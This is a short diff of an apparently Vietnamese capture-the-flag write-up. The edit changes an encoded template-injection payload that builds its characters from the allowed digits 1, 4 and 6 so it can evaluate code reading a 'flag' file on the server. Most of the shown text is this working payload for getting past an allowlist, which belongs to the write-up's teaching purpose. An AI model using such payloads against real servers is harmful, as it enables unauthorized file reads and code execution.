@@ -65,11 +65,11 @@ g
 ```
 Trong thử thách này chỉ sử dụng được các chữ cái trong allowlist là : 1, 4, 6. Nhưng như thế là đủ vì mình có thể cộng trừ các số để thành một số phù hợp.
 
-Payload của mình có dạng: `{{\ropen('flag').read()}}`
+Payload của mình có dạng: `{{\ropen('flag').read()}}` (`/n` cũng khả thi)
 
 tương đương với: 
 ```
-{{((6%2b6%2b1)|ch%2b'o'%2b(111%2b1)|ch%2b'e'%2b(111-1)|ch%2b'("'%2b(46%2b1)|ch%2b(61%2b41)|ch%2b'l'%2b(111-14)|ch%2b(61%2b41%2b1)|ch%2b'"'%2b')'%2b46|ch%2b're'%2b(111-14)|ch%2b'd()')|e}}
+{{((6%2b6)|ch%2b'o'%2b(111%2b1)|ch%2b'e'%2b(111-1)|ch%2b'("'%2b(46%2b1)|ch%2b(61%2b41)|ch%2b'l'%2b(111-14)|ch%2b(61%2b41%2b1)|ch%2b'"'%2b')'%2b46|ch%2b're'%2b(111-14)|ch%2b'd()')|e}}
 ```
 
 Gửi requests và nhận được flag trong phần reponse:
